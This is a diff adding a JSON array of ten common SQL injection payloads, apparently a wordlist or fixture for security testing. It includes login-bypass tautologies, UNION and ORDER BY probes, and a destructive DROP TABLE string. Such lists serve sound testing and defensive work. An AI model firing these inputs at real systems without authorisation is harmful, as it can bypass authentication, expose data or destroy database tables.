@@ -1,0 +1,12 @@
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "'; DROP TABLE users; --",
+  "1' OR '1'='1",
+  "1' UNION SELECT null, null, null --",
+  "admin' --",
+  "admin' #",
+  "1' AND 1=1 --",
+  "1' AND 1=2 --",
+  "1' ORDER BY 1 --"
+]
